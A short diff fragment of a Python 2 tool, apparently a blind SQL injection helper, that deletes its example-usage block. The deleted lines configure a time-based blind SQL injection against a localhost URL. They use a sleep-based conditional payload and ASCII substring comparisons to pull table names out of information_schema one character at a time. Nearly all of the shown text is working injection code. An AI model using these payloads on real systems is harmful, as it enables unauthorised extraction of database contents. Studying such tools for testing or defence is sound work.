@@ -99,13 +99,3 @@ File "%(filename)s", line %(lineno)s, in %(name)s
                                 break
                         self.result.append(result)
                         result = ''
-
-
-blind_magic = Blind_magic()
-blind_magic.l(13,5,0,0,0,1,0,0,0,0)
-blind_magic.url = "http://localhost/evn/?q="
-blind_magic.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"
-blind_magic.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"
-blind_magic.query = "select table_name from information_schema.tables limit {l2},1"
-blind_magic.run()
-print blind_magic.result
